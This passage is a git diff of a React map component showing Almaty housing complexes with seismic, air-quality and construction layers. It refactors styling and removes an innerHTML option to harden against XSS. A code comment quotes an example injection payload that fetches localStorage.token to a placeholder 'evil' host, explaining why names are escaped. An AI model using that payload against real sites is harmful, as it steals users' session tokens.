@@ -1,10 +1,12 @@
 "use client";
 
-import { useEffect, useRef, useState, useMemo, useCallback } from "react";
+import { useEffect, useRef, useState, useMemo } from "react";
 import { useTranslation } from "react-i18next";
 import maplibregl, { type FilterSpecification } from "maplibre-gl";
 import "maplibre-gl/dist/maplibre-gl.css";
-import { Activity, Construction, House, LandPlot, Wind, type LucideIcon } from "lucide-react";
+import { FeaturePanel } from "./FeaturePanel";
+import { MapLegend } from "./MapLegend";
+import { readMapColor, popupIcon } from "./feature-style";
 import type { MapData } from "@/hooks/useComplexes";
 import { formatPrice } from "@/lib/utils";
 import { useTheme } from "@/components/theme-provider";
@@ -14,7 +16,6 @@ import {
   formatCompletion,
   isNewBuilding,
   isUnderConstruction,
-  newBuildingSince,
   type Stage,
 } from "@/lib/construction";
 
@@ -45,12 +46,14 @@ const COMPLEX_STROKE_WIDTH: CirclePaint["circle-stroke-width"] = [
   ["==", ["get", "underConstruction"], 1], 3,
   2,
 ];
-const COMPLEX_STROKE_COLOR: CirclePaint["circle-stroke-color"] = [
-  "case",
-  ["==", ["get", "problematic"], 1], "#7f1d1d", // dark crimson ring
-  ["==", ["get", "underConstruction"], 1], "#0284c7", // sky-600 — строится
-  "#fff",
-];
+function complexStrokeColor(): CirclePaint["circle-stroke-color"] {
+  return [
+    "case",
+    ["==", ["get", "problematic"], 1], readMapColor("marker-problematic-ring"),
+    ["==", ["get", "underConstruction"], 1], readMapColor("marker-building"),
+    "#fff",
+  ];
+}
 
 // Map layers behind each key-feature toggle.
 const SEISMIC_LAYERS = [
@@ -67,66 +70,9 @@ function setLayersVisible(map: maplibregl.Map, ids: string[], visible: boolean) 
   }
 }
 
-/** One of the key features (seismic, air, new buildings, genplan): a
- *  large pill that is always on screen, filled with its colour when on. */
-function FeatureToggle({
-  active, onToggle, icon: Icon, label, title, count, activeClass, iconClass,
-}: {
-  active: boolean;
-  onToggle: () => void;
-  icon: LucideIcon;
-  label: string;
-  title: string;
-  count?: number;
-  activeClass: string;
-  iconClass: string;
-}) {
-  return (
-    <button
-      type="button"
-      onClick={onToggle}
-      aria-pressed={active}
-      title={title}
-      className={`flex items-center gap-1.5 h-8 px-3 rounded-full border shadow-md text-xs font-semibold backdrop-blur transition-colors ${
-        active
-          ? `${activeClass} text-white border-transparent`
-          : "bg-card/95 text-card-foreground border-border hover:bg-muted"
-      }`}
-    >
-      <Icon className={`h-4 w-4 ${active ? "" : iconClass}`} />
-      {label}
-      {count != null && (
-        <span
-          className={`rounded-full px-1.5 text-[10px] font-medium ${
-            active ? "bg-white/25" : "bg-muted text-muted-foreground"
-          }`}
-        >
-          {count}
-        </span>
-      )}
-    </button>
-  );
-}
-
 /** Minimum live sensors before an interpolated PM2.5 surface is honest.
  *  The normal aggregator returns ~380; the emergency fallbacks return ~3. */
 const MIN_STATIONS_FOR_HEATMAP = 10;
-
-function getScoreColor(score: number | null): string {
-  if (!score) return "#999";
-  if (score >= 85) return "#22c55e";
-  if (score >= 70) return "#eab308";
-  return "#f97316";
-}
-
-function getSeismicColor(risk: string | null): string {
-  if (!risk) return "#999";
-  const colors: Record<string, string> = {
-    critical: "#dc2626", high: "#f97316", moderate: "#eab308",
-    low: "#84cc16", safe: "#22c55e",
-  };
-  return colors[risk] || "#999";
-}
 
 function getSeismicLabelKey(risk: string | null): string | null {
   const keys: Record<string, string> = {
@@ -154,8 +100,8 @@ function getAirLabelKey(level: string | null | undefined): string | null {
 }
 
 function getFaultColor(danger: number): string {
-  if (danger >= 3) return "#dc2626";
-  if (danger >= 2) return "#f97316";
+  if (danger >= 3) return readMapColor("risk-critical");
+  if (danger >= 2) return readMapColor("risk-high");
   return "#9ca3af";
 }
 
@@ -166,30 +112,25 @@ function getFaultColor(danger: number): string {
  * listing with a name like `<img onerror="fetch('//evil/'+localStorage.token)">`
  * would otherwise execute on every map hover.
  *
- * `text:` always goes through textContent (auto-escapes). Use `html:` only
- * for known-safe static markup (no user data).
+ * `text:` always goes through textContent (auto-escapes).
  */
 function el(
   tag: string,
   opts: {
     css?: string;
     text?: string;
-    html?: string;
     children?: (Node | null | false | undefined)[];
   } = {},
 ): HTMLElement {
   const node = document.createElement(tag);
   if (opts.css) node.style.cssText = opts.css;
   if (opts.text != null) node.textContent = opts.text;
-  if (opts.html != null) node.innerHTML = opts.html;
   if (opts.children) {
     for (const c of opts.children) if (c) node.appendChild(c);
   }
   return node;
 }
 
-// MapTiler free key for 3D building tiles
-const MAPTILER_KEY = "get_your_own_OpIi9ZULNHzrESv6T2vL";
 const MAP_STYLE_LIGHT = "https://basemaps.cartocdn.com/gl/positron-gl-style/style.json";
 const MAP_STYLE_DARK = "https://basemaps.cartocdn.com/gl/dark-matter-gl-style/style.json";
 
@@ -224,7 +165,7 @@ export default function MapView({
   const toggleStage = (stage: Stage) =>
     setStages(stages.includes(stage) ? stages.filter((s) => s !== stage) : [...stages, stage]);
   // The load handler re-applies toggles and the marker filter, so a map
-  // rebuilt by a theme or data change keeps what the user chose.
+  // rebuilt after a style or data change keeps what the user chose.
   const layersRef = useRef({ seismic: showFaults, air: showAirQuality, genplan: showGenplanDetailed });
   layersRef.current = { seismic: showFaults, air: showAirQuality, genplan: showGenplanDetailed };
   // View mode: false = вид сверху (pitch 0, default), true = объёмный.
@@ -233,6 +174,9 @@ export default function MapView({
   const view3dRef = useRef(false);
   const { resolvedTheme } = useTheme();
   const isDark = resolvedTheme === "dark";
+  const themeRef = useRef(isDark);
+  themeRef.current = isDark;
+  const appliedThemeRef = useRef(isDark);
 
   const underConstructionCount = useMemo(
     () => data.complexes.filter(isUnderConstruction).length,
@@ -283,7 +227,7 @@ export default function MapView({
     // heatmap rather than imply knowledge we don't have.
     if (data.airStations.length < MIN_STATIONS_FOR_HEATMAP) return [];
     return generateInterpolatedGrid(
-      data.airStations.map((s: any) => ({ lat: s.lat, lng: s.lng, pm25: s.pm25 })),
+      data.airStations.map((s) => ({ lat: s.lat, lng: s.lng, pm25: s.pm25 })),
       60,  // cols
       60,  // rows
       8,   // top-K nearest neighbors
@@ -296,9 +240,12 @@ export default function MapView({
   useEffect(() => {
     if (!mapContainer.current || mapRef.current) return;
 
+    const palette = Object.fromEntries(["safe", "low", "moderate", "high", "critical"].map((risk) => [risk, readMapColor(`risk-${risk}`)]));
+    const getSeismicColor = (risk: string | null) => palette[risk || ""] || "#999";
+    const getScoreColor = (score: number | null) => !score ? "#999" : score >= 85 ? palette.safe : score >= 70 ? palette.moderate : palette.high;
     const map = new maplibregl.Map({
       container: mapContainer.current,
-      style: isDark ? MAP_STYLE_DARK : MAP_STYLE_LIGHT,
+      style: themeRef.current ? MAP_STYLE_DARK : MAP_STYLE_LIGHT,
       center: [76.9286, 43.238],
       zoom: 12,
       // Default = чистый вид сверху (pitch 0, без наклона/искажений).
@@ -307,11 +254,22 @@ export default function MapView({
       pitch: view3dRef.current ? 60 : 0,
       bearing: view3dRef.current ? -10 : 0,
     });
+    appliedThemeRef.current = themeRef.current;
 
     map.addControl(new maplibregl.NavigationControl({ visualizePitch: true }), "top-right");
     mapRef.current = map;
 
-    map.on("load", () => {
+    // Rebuild our layers after a basemap style swap, keeping the Map instance
+    // and camera. Dispose old delegated listeners/popups before adding new ones.
+    const cleanups: (() => void)[] = [];
+    function onLayer(type: "mouseenter" | "mouseleave" | "click", layer: string, listener: (event: maplibregl.MapLayerMouseEvent) => void) {
+      map.on(type, layer, listener);
+      cleanups.push(() => map.off(type, layer, listener));
+    }
+    let fitted = false;
+    map.on("style.load", () => {
+      cleanups.splice(0).forEach((cleanup) => cleanup());
+      const isDark = themeRef.current;
       // === ALMATY CITY BOUNDARY ===
       // Drawn first so everything else renders on top. Pure outline, no
       // fill — just shows the user where Almaty ends. Static OSM polygon
@@ -319,7 +277,7 @@ export default function MapView({
       if (data.cityBoundary?.features?.length) {
         map.addSource("city-boundary", {
           type: "geojson",
-          data: data.cityBoundary as any,
+          data: data.cityBoundary,
         });
         map.addLayer({
           id: "city-boundary-line",
@@ -439,18 +397,19 @@ export default function MapView({
 
         // Fault click popup
         const faultPopup = new maplibregl.Popup({ closeButton: true, closeOnClick: true, maxWidth: "300px" });
+        cleanups.push(() => faultPopup.remove());
 
         for (const danger of [3, 2, 1]) {
           const layerId = `faults-lines-${danger}`;
-          map.on("mouseenter", layerId, () => { map.getCanvas().style.cursor = "crosshair"; });
-          map.on("mouseleave", layerId, () => { map.getCanvas().style.cursor = ""; });
+          onLayer("mouseenter", layerId, () => { map.getCanvas().style.cursor = "crosshair"; });
+          onLayer("mouseleave", layerId, () => { map.getCanvas().style.cursor = ""; });
 
-          map.on("click", layerId, (e) => {
+          onLayer("click", layerId, (e) => {
             e.originalEvent.stopPropagation();
             const props = e.features?.[0]?.properties;
             if (!props) return;
 
-            const dangerColor = props.danger >= 3 ? "#dc2626" : props.danger >= 2 ? "#f97316" : "#9ca3af";
+            const dangerColor = getFaultColor(Number(props.danger));
             const dangerKey = props.danger >= 3 ? "map.faultConfirmed" : props.danger >= 2 ? "map.faultStudied" : "map.faultDisputed";
 
             const nearby = data.complexes
@@ -474,7 +433,7 @@ export default function MapView({
                   css: "font-size:12px",
                   children: [
                     el("span", {
-                      css: `color:${dangerColor};font-weight:bold`,
+                      css: `border-left:3px solid ${dangerColor};padding-left:6px;font-weight:bold`,
                       text: tRef.current(dangerKey),
                     }),
                   ],
@@ -484,14 +443,14 @@ export default function MapView({
                       css: "margin-top:8px;border-top:1px solid #eee;padding-top:6px",
                       children: [
                         el("p", {
-                          css: "font-size:11px;color:#666;margin-bottom:4px",
+                          css: "font-size:12px;color:hsl(var(--muted-foreground));margin-bottom:4px",
                           text: tRef.current("map.nearbyComplexes"),
                         }),
                         ...nearby.map((c) => {
                           const dist = c.seismicDistanceMeters
                             ? c.seismicDistanceMeters < 1000
-                              ? `${c.seismicDistanceMeters} м`
-                              : `${(c.seismicDistanceMeters / 1000).toFixed(1)} км`
+                              ? tRef.current("common.meters", { value: c.seismicDistanceMeters })
+                              : tRef.current("common.kilometers", { value: (c.seismicDistanceMeters / 1000).toFixed(1) })
                             : "—";
                           return el("div", {
                             css: "display:flex;align-items:center;gap:6px;margin-bottom:2px;font-size:12px",
@@ -501,7 +460,7 @@ export default function MapView({
                               }),
                               // c.displayName comes from Krisha — XSS vector. textContent escapes it.
                               el("span", { css: "flex:1", text: String(c.displayName || "") }),
-                              el("span", { css: "color:#888", text: dist }),
+                              el("span", { css: "color:hsl(var(--muted-foreground))", text: dist }),
                             ],
                           });
                         }),
@@ -563,7 +522,7 @@ export default function MapView({
         });
 
         // 2) Real station markers — interactive layer with popup.
-        const stationFeatures = data.airStations.map((s: any) => ({
+        const stationFeatures = data.airStations.map((s) => ({
           type: "Feature" as const,
           geometry: { type: "Point" as const, coordinates: [s.lng, s.lat] },
           properties: {
@@ -618,12 +577,14 @@ export default function MapView({
           closeOnClick: false,
           maxWidth: "240px",
         });
-        map.on("mouseenter", "air-stations-circles", (e) => {
+        cleanups.push(() => stationPopup.remove());
+        onLayer("mouseenter", "air-stations-circles", (e) => {
           map.getCanvas().style.cursor = "help";
           const f = e.features?.[0];
           if (!f) return;
           const p = f.properties;
-          const coords = (f.geometry as any).coordinates.slice();
+          if (f.geometry.type !== "Point") return;
+          const coords = f.geometry.coordinates.slice() as [number, number];
           const dateLocale = langRef.current?.startsWith("kk") ? "kk-KZ" : "ru-RU";
           const date = p.updatedAt ? new Date(p.updatedAt).toLocaleString(dateLocale, {
             day: "2-digit", month: "2-digit", hour: "2-digit", minute: "2-digit",
@@ -639,22 +600,23 @@ export default function MapView({
               el("div", {
                 css: "display:flex;align-items:center;gap:6px;margin-bottom:4px",
                 children: [
+                  popupIcon("air"),
                   el("span", { css: `width:10px;height:10px;border-radius:50%;background:${safeColor}` }),
                   el("strong", { text: String(p.name || "") }),
                 ],
               }),
               el("div", {
-                css: `font-size:18px;font-weight:700;color:${safeColor}`,
+                css: "font-size:18px;font-weight:700",
                 children: [
                   document.createTextNode(`${p.pm25} `),
                   el("span", {
-                    css: "font-size:11px;font-weight:400;color:#666",
-                    text: "µg/m³",
+                    css: "font-size:12px;font-weight:400;color:hsl(var(--muted-foreground))",
+                    text: tRef.current("airHistory.unit"),
                   }),
                 ],
               }),
               el("div", {
-                css: `color:${safeColor};font-size:11px;font-weight:500`,
+                css: "font-size:12px;font-weight:500",
                 text: (() => {
                   const key = getAirLabelKey(p.level);
                   return key ? tRef.current(key) : String(p.levelLabel || "");
@@ -662,18 +624,18 @@ export default function MapView({
               }),
               p.origin
                 ? el("div", {
-                    css: "color:#888;font-size:10px;margin-top:4px",
+                    css: "color:hsl(var(--muted-foreground));font-size:12px;margin-top:4px",
                     text:
                       tRef.current("map.popupSource", { name: String(p.origin) }) +
                       (p.district ? " · " + String(p.district) : ""),
                   })
                 : null,
-              date ? el("div", { css: "color:#aaa;font-size:10px", text: date }) : null,
+              date ? el("div", { css: "color:hsl(var(--muted-foreground));font-size:12px", text: date }) : null,
             ],
           });
           stationPopup.setLngLat(coords).setDOMContent(popupRoot).addTo(map);
         });
-        map.on("mouseleave", "air-stations-circles", () => {
+        onLayer("mouseleave", "air-stations-circles", () => {
           map.getCanvas().style.cursor = "";
           stationPopup.remove();
         });
@@ -696,7 +658,7 @@ export default function MapView({
           district: c.district,
           scoreColor: getScoreColor(c.scoreTotal),
           seismicColor: getSeismicColor(c.seismicRiskLevel),
-          // Akimat-flagged: drives the red ring + crimson fill on the
+          // Akimat-flagged: drives the dark ring + raspberry fill on the
           // marker. Even when the ЖК scores well on seismic / commute we
           // override the colour — the "не покупайте" signal trumps
           // everything else on the map.
@@ -737,12 +699,12 @@ export default function MapView({
           ],
           "circle-color": [
             "case",
-            ["==", ["get", "problematic"], 1], "#dc2626", // crimson — акимат пометил
+            ["==", ["get", "problematic"], 1], readMapColor("marker-problematic"),
             ["get", "seismicColor"],
           ],
           "circle-opacity": 0.85,
           "circle-stroke-width": COMPLEX_STROKE_WIDTH,
-          "circle-stroke-color": COMPLEX_STROKE_COLOR,
+          "circle-stroke-color": complexStrokeColor(),
         },
       });
 
@@ -752,32 +714,34 @@ export default function MapView({
         source: "complexes",
         layout: {
           "text-field": ["get", "name"],
-          "text-size": 11,
+          "text-size": 12,
           "text-offset": [0, 1.8],
           "text-anchor": "top",
           "text-max-width": 10,
         },
         paint: {
-          "text-color": "#374151",
-          "text-halo-color": "#fff",
+          "text-color": readMapColor("map-label"),
+          "text-halo-color": readMapColor("map-label-halo"),
           "text-halo-width": 1.5,
         },
       });
 
       // Hover popup
       const popup = new maplibregl.Popup({ closeButton: false, closeOnClick: false, maxWidth: "280px" });
+      cleanups.push(() => popup.remove());
 
-      map.on("mouseenter", "complexes-circles", (e) => {
+      onLayer("mouseenter", "complexes-circles", (e) => {
         map.getCanvas().style.cursor = "pointer";
         const feature = e.features?.[0];
         if (!feature) return;
         const props = feature.properties;
-        const coords = (feature.geometry as any).coordinates.slice();
+        if (feature.geometry.type !== "Point") return;
+        const coords = feature.geometry.coordinates.slice() as [number, number];
 
         const seismicDist = props.seismicDist;
-        const seismicDistStr = seismicDist ? (seismicDist < 1000 ? `${seismicDist} м` : `${(seismicDist / 1000).toFixed(1)} км`) : "";
+        const seismicDistStr = seismicDist ? (seismicDist < 1000 ? tRef.current("common.meters", { value: seismicDist }) : tRef.current("common.kilometers", { value: (seismicDist / 1000).toFixed(1) })) : "";
         const seismicRisk = props.seismic || "safe";
-        const seismicBg = (seismicRisk === "critical" || seismicRisk === "high") ? "#fef2f2" : seismicRisk === "moderate" ? "#fffbeb" : "#f0fdf4";
+        const seismicBg = "rgb(var(--feature-seismic) / 0.08)";
         const seismicLabelKey = getSeismicLabelKey(seismicRisk);
         const seismicLabel = seismicLabelKey ? tRef.current(seismicLabelKey) : "";
 
@@ -794,12 +758,22 @@ export default function MapView({
                 el("strong", { css: "font-size:14px", text: String(props.name || "") }),
                 props.score
                   ? el("span", {
-                      css: `background:${safeScoreColor};color:white;padding:2px 8px;border-radius:12px;font-weight:bold;font-size:12px`,
+                      css: `background:${safeScoreColor};color:#18181b;padding:2px 8px;border-radius:12px;font-weight:bold;font-size:12px`,
                       text: `${Math.round(props.score)}%`,
                     })
                   : null,
               ],
             }),
+            // Akimat warnings precede prices and other feature data.
+            props.problematic
+              ? el("div", {
+                  css: "display:flex;align-items:center;gap:6px;margin-top:6px;padding:6px 8px;border-radius:6px;font-size:12px;font-weight:600;background:rgb(var(--problematic-surface));color:rgb(var(--problematic));border:1px solid currentColor",
+                  children: [
+                    popupIcon("problematic"),
+                    el("span", { text: tRef.current("map.problematicBadge") }),
+                  ],
+                })
+              : null,
             props.priceMin && props.priceMax
               ? el("div", {
                   css: "font-weight:600;margin-top:4px",
@@ -807,10 +781,10 @@ export default function MapView({
                 })
               : null,
             el("div", {
-              css: "display:flex;gap:12px;margin-top:4px;color:#666;font-size:12px",
+              css: "display:flex;gap:12px;margin-top:4px;color:hsl(var(--muted-foreground));font-size:12px",
               children: [
                 el("span", {
-                  text: `🏠 ${tRef.current("map.popupListings", { count: props.listings })}`,
+                  text: tRef.current("map.popupListings", { count: props.listings }),
                 }),
                 // Commute deliberately hidden from the hover popup. The map
                 // shows complexes deduplicated globally, so the commute
@@ -822,9 +796,9 @@ export default function MapView({
             }),
             props.underConstruction
               ? el("div", {
-                  css: "display:flex;align-items:center;gap:6px;margin-top:6px;padding:4px 6px;border-radius:6px;font-size:11px;font-weight:600;background:#f0f9ff;color:#075985;border:1px solid #bae6fd",
+                  css: "display:flex;align-items:center;gap:6px;margin-top:6px;padding:4px 6px;border-radius:6px;font-size:12px;font-weight:600;background:rgb(var(--feature-building) / 0.08);color:rgb(var(--feature-building));border:1px solid currentColor",
                   children: [
-                    el("span", { text: "🏗" }),
+                    popupIcon("building"),
                     el("span", {
                       text: (() => {
                         const label = tRef.current("map.popupUnderConstruction");
@@ -845,9 +819,9 @@ export default function MapView({
               : null,
             props.newBuilding
               ? el("div", {
-                  css: "display:flex;align-items:center;gap:6px;margin-top:6px;padding:4px 6px;border-radius:6px;font-size:11px;font-weight:600;background:#f5f3ff;color:#5b21b6;border:1px solid #ddd6fe",
+                  css: "display:flex;align-items:center;gap:6px;margin-top:6px;padding:4px 6px;border-radius:6px;font-size:12px;font-weight:600;background:rgb(var(--feature-new) / 0.08);color:rgb(var(--feature-new));border:1px solid currentColor",
                   children: [
-                    el("span", { text: "🏠" }),
+                    popupIcon("new"),
                     el("span", {
                       text: tRef.current("map.popupNewBuilding", { year: Number(props.builtYear) }),
                     }),
@@ -856,28 +830,17 @@ export default function MapView({
               : null,
             seismicDist
               ? el("div", {
-                  css: `display:flex;align-items:center;gap:6px;margin-top:6px;padding:4px 6px;border-radius:6px;font-size:11px;background:${seismicBg}`,
+                  css: `display:flex;align-items:center;gap:6px;margin-top:6px;padding:4px 6px;border-radius:6px;font-size:12px;background:${seismicBg}`,
                   children: [
+                    popupIcon("seismic"),
                     el("span", {
                       css: `width:8px;height:8px;border-radius:50%;background:${getSeismicColor(seismicRisk)};flex-shrink:0`,
                     }),
                     el("span", { text: seismicLabel }),
                     el("span", {
-                      css: "color:#888;margin-left:auto",
+                      css: "color:hsl(var(--muted-foreground));margin-left:auto",
                       text: `${seismicDistStr} ${tRef.current("map.toFault")}`,
                     }),
-                  ],
-                })
-              : null,
-            // Pinned at the bottom so it visually anchors the popup and is
-            // the last thing the eye lands on before the user clicks. All
-            // text comes from i18n — no attacker-controlled fields here.
-            props.problematic
-              ? el("div", {
-                  css: "display:flex;align-items:center;gap:6px;margin-top:6px;padding:6px 8px;border-radius:6px;font-size:11px;font-weight:600;background:#fef2f2;color:#7f1d1d;border:1px solid #fecaca",
-                  children: [
-                    el("span", { css: "font-size:13px", text: "⚠️" }),
-                    el("span", { text: tRef.current("map.problematicBadge") }),
                   ],
                 })
               : null,
@@ -887,12 +850,12 @@ export default function MapView({
             // `text:`), never innerHTML, so no XSS.
             String(props.lastCommentText || "").length > 0
               ? el("div", {
-                  css: "margin-top:6px;padding:6px 8px;border-radius:6px;font-size:11px;background:#eff6ff;color:#1e3a8a;border:1px solid #bfdbfe",
+                  css: "margin-top:6px;padding:6px 8px;border-radius:6px;font-size:12px;background:hsl(var(--muted));color:hsl(var(--foreground));border:1px solid hsl(var(--border))",
                   children: [
                     el("div", {
                       css: "font-weight:600;display:flex;align-items:center;gap:5px;margin-bottom:2px",
                       children: [
-                        el("span", { text: "💬" }),
+                        popupIcon("comment"),
                         el("span", {
                           text:
                             Number(props.commentCount) > 1
@@ -902,15 +865,15 @@ export default function MapView({
                       ],
                     }),
                     el("div", {
-                      css: "color:#1e40af;font-style:italic;line-height:1.3",
+                      css: "color:hsl(var(--muted-foreground));font-style:italic;line-height:1.3",
                       text: `«${String(props.lastCommentText)}»`,
                     }),
                   ],
                 })
               : el("div", {
-                  css: "margin-top:6px;padding:6px 8px;border-radius:6px;font-size:11px;font-weight:500;background:#f1f5f9;color:#475569;border:1px dashed #cbd5e1;display:flex;align-items:center;gap:6px",
+                  css: "margin-top:6px;padding:6px 8px;border-radius:6px;font-size:12px;font-weight:500;background:hsl(var(--muted));color:hsl(var(--muted-foreground));border:1px dashed hsl(var(--border));display:flex;align-items:center;gap:6px",
                   children: [
-                    el("span", { text: "💬" }),
+                    popupIcon("comment"),
                     el("span", { text: tRef.current("map.commentNudge") }),
                   ],
                 }),
@@ -919,12 +882,12 @@ export default function MapView({
         popup.setLngLat(coords).setDOMContent(popupRoot).addTo(map);
       });
 
-      map.on("mouseleave", "complexes-circles", () => {
+      onLayer("mouseleave", "complexes-circles", () => {
         map.getCanvas().style.cursor = "";
         popup.remove();
       });
 
-      map.on("click", "complexes-circles", (e) => {
+      onLayer("click", "complexes-circles", (e) => {
         e.originalEvent.stopPropagation();
         const id = e.features?.[0]?.properties?.id;
         if (id && onComplexClickRef.current) onComplexClickRef.current(id);
@@ -937,15 +900,29 @@ export default function MapView({
       for (const id of COMPLEX_LAYERS) map.setFilter(id, markerFilterRef.current);
 
       // Fit bounds
-      if (complexFeatures.length > 0) {
+      if (!fitted && complexFeatures.length > 0) {
+        fitted = true;
         const bounds = new maplibregl.LngLatBounds();
         complexFeatures.forEach((f) => bounds.extend(f.geometry.coordinates as [number, number]));
         map.fitBounds(bounds, { padding: 80, maxZoom: 14, pitch: view3dRef.current ? 45 : 0 });
       }
     });
 
-    return () => { map.remove(); mapRef.current = null; };
-  }, [data, isDark, airGrid]);
+    const resizeObserver = new ResizeObserver(() => map.resize());
+    resizeObserver.observe(mapContainer.current);
+    return () => {
+      resizeObserver.disconnect();
+      cleanups.forEach((cleanup) => cleanup());
+      map.remove();
+      mapRef.current = null;
+    };
+  }, [data, airGrid]);
+
+  useEffect(() => {
+    if (appliedThemeRef.current === isDark) return;
+    appliedThemeRef.current = isDark;
+    mapRef.current?.setStyle(isDark ? MAP_STYLE_DARK : MAP_STYLE_LIGHT, { diff: false });
+  }, [isDark]);
 
   // Fly to selected complex
   useEffect(() => {
@@ -968,14 +945,10 @@ export default function MapView({
         ["==", ["get", "id"], hoveredComplexId], 4,
         COMPLEX_STROKE_WIDTH,
       ]);
-      map.setPaintProperty("complexes-circles", "circle-stroke-color", [
-        "case",
-        ["==", ["get", "id"], hoveredComplexId], "#3b82f6",
-        COMPLEX_STROKE_COLOR,
-      ]);
+      map.setPaintProperty("complexes-circles", "circle-stroke-color", complexStrokeColor());
     } else {
       map.setPaintProperty("complexes-circles", "circle-stroke-width", COMPLEX_STROKE_WIDTH);
-      map.setPaintProperty("complexes-circles", "circle-stroke-color", COMPLEX_STROKE_COLOR);
+      map.setPaintProperty("complexes-circles", "circle-stroke-color", complexStrokeColor());
     }
   }, [hoveredComplexId]);
 
@@ -999,67 +972,23 @@ export default function MapView({
   }, [markerFilter]);
 
   return (
-    <div className="relative w-full h-full">
-      <div ref={mapContainer} className="w-full h-full" />
-
-      {/* Key features, always on screen: three layers and the two stage
-          filters («Строящиеся», «Новостройки»). Wraps on phones; the
-          right margin keeps clear of the zoom/compass control. */}
-      <div className="absolute top-2 left-2 right-12 sm:top-3 sm:left-3 z-10 flex flex-wrap gap-1.5">
-        <FeatureToggle
-          active={showFaults}
-          onToggle={() => setShowFaults((v) => !v)}
-          icon={Activity}
-          label={t("map.featureSeismic")}
-          title={t("map.featureSeismicHint")}
-          activeClass="bg-red-600 hover:bg-red-700"
-          iconClass="text-red-600"
-        />
-        <FeatureToggle
-          active={showAirQuality}
-          onToggle={() => setShowAirQuality((v) => !v)}
-          icon={Wind}
-          label={t("map.featureAir")}
-          title={t("map.airQuality")}
-          activeClass="bg-emerald-600 hover:bg-emerald-700"
-          iconClass="text-emerald-600"
-        />
-        {underConstructionCount > 0 && (
-          <FeatureToggle
-            active={stages.includes("building")}
-            onToggle={() => toggleStage("building")}
-            icon={Construction}
-            label={t("map.featureBuilding")}
-            title={t("map.featureBuildingHint")}
-            count={underConstructionCount}
-            activeClass="bg-sky-600 hover:bg-sky-700"
-            iconClass="text-sky-600"
-          />
-        )}
-        {newBuildingCount > 0 && (
-          <FeatureToggle
-            active={stages.includes("new")}
-            onToggle={() => toggleStage("new")}
-            icon={House}
-            label={t("map.featureNew")}
-            title={t("map.featureNewHint", { year: newBuildingSince() })}
-            count={newBuildingCount}
-            activeClass="bg-violet-600 hover:bg-violet-700"
-            iconClass="text-violet-600"
-          />
-        )}
-        {hasGenplan && (
-          <FeatureToggle
-            active={showGenplanDetailed}
-            onToggle={() => setShowGenplanDetailed((v) => !v)}
-            icon={LandPlot}
-            label={t("map.featureGenplan")}
-            title={t("map.genplanDetailed")}
-            activeClass="bg-teal-600 hover:bg-teal-700"
-            iconClass="text-teal-600"
-          />
-        )}
-      </div>
+    <div className="public-map-ui relative flex h-full w-full min-w-0 flex-col">
+      <FeaturePanel
+        active={{ seismic: showFaults, air: showAirQuality, genplan: showGenplanDetailed, building: stages.includes("building"), new: stages.includes("new") }}
+        buildingCount={underConstructionCount} newCount={newBuildingCount} hasGenplan={hasGenplan}
+        onToggle={(feature) => {
+          if (feature === "seismic") setShowFaults((v) => !v);
+          else if (feature === "air") setShowAirQuality((v) => !v);
+          else if (feature === "genplan") setShowGenplanDetailed((v) => !v);
+          else toggleStage(feature);
+        }}
+      />
+      <div className="relative min-h-0 flex-1">
+        {/* MapLibre sets position:relative on its own container. Keep the
+            absolute sizing on a separate wrapper so CSS order cannot collapse it. */}
+        <div className="absolute inset-0">
+          <div ref={mapContainer} className="dreamapt-map h-full w-full" />
+        </div>
 
       {/* View-mode toggle — вид сверху (по умолчанию) ↔ объёмный.
           Bottom-right, above the attribution; sized for thumb tap on
@@ -1078,77 +1007,20 @@ export default function MapView({
           });
         }}
         title={view3d ? t("map.view2d") : t("map.view3d")}
-        className="absolute bottom-9 right-2 sm:bottom-10 sm:right-3 z-10 flex items-center gap-1.5 bg-card/95 text-card-foreground border border-border backdrop-blur rounded-lg shadow-lg px-2.5 py-2 hover:bg-muted transition-colors"
+        aria-label={view3d ? t("map.view2d") : t("map.view3d")}
+        className="absolute min-h-11 min-w-11 bottom-10 right-2 sm:right-3 z-10 flex items-center gap-1.5 bg-card/95 text-card-foreground border border-border backdrop-blur rounded-lg shadow-lg px-2.5 py-2 hover:bg-muted transition-colors"
       >
-        <span className="text-[11px] font-bold w-5 text-center">{view3d ? "2D" : "3D"}</span>
+        <span className="text-[11px] font-bold w-5 text-center">{t(view3d ? "map.mode2d" : "map.mode3d")}</span>
         <span className="hidden sm:inline text-xs font-medium">
           {view3d ? t("map.view2d") : t("map.view3d")}
         </span>
       </button>
 
-      {/* Compact legend */}
-      <div className="absolute bottom-2 left-2 sm:bottom-3 sm:left-3 bg-card/95 text-card-foreground border border-border backdrop-blur rounded-lg shadow-lg p-2 sm:p-2.5 text-[9px] sm:text-[10px] space-y-0.5 sm:space-y-1 z-10">
-        {/* Marker shape legend — explains the two visual languages on the
-            map (solid circle = ЖК, ring = AirKaz station). Without this
-            the donut markers blend in as "weirdly drawn ЖК". */}
-        <div className="space-y-0.5 pb-1 mb-1 border-b">
-          <div className="flex items-center gap-1.5">
-            <span className="w-2.5 h-2.5 rounded-full bg-muted-foreground" />
-            {t("map.markerComplex")}
-          </div>
-          {underConstructionCount > 0 && (
-            <div className="flex items-center gap-1.5">
-              <span className="w-2.5 h-2.5 rounded-full bg-muted-foreground ring-2 ring-sky-600" />
-              {t("map.markerUnderConstruction")} ({underConstructionCount})
-            </div>
-          )}
-          {showAirQuality && (
-            <div className="flex items-center gap-1.5">
-              <span className="w-2.5 h-2.5 rounded-full bg-background border-2 border-muted-foreground" />
-              {t("map.markerStation")}
-            </div>
-          )}
-        </div>
-
-        <div className="font-medium text-[10px]">{t("map.legend")}</div>
-        <div className="flex items-center gap-1.5"><span className="w-2.5 h-2.5 rounded-full bg-green-500" />{t("map.legendSafe")} ({riskCounts.safe})</div>
-        <div className="flex items-center gap-1.5"><span className="w-2.5 h-2.5 rounded-full bg-yellow-500" />{t("map.legendModerate")} ({riskCounts.moderate})</div>
-        <div className="flex items-center gap-1.5"><span className="w-2.5 h-2.5 rounded-full bg-orange-500" />{t("map.legendHigh")} ({riskCounts.high})</div>
-        <div className="flex items-center gap-1.5"><span className="w-2.5 h-2.5 rounded-full bg-red-600" />{t("map.legendCritical")} ({riskCounts.critical})</div>
-        {showFaults && (
-          <div className="border-t pt-1 mt-1 space-y-0.5">
-            <div className="flex items-center gap-1.5"><span className="w-3 h-px bg-red-600" />{t("map.faultLabel")}</div>
-          </div>
-        )}
-        {showGenplanDetailed && (
-          <div className="border-t pt-1 mt-1">
-            <div className="font-medium text-[10px]">{t("map.genplanDetailed")}</div>
-            <div className="text-[9px] text-muted-foreground leading-snug">
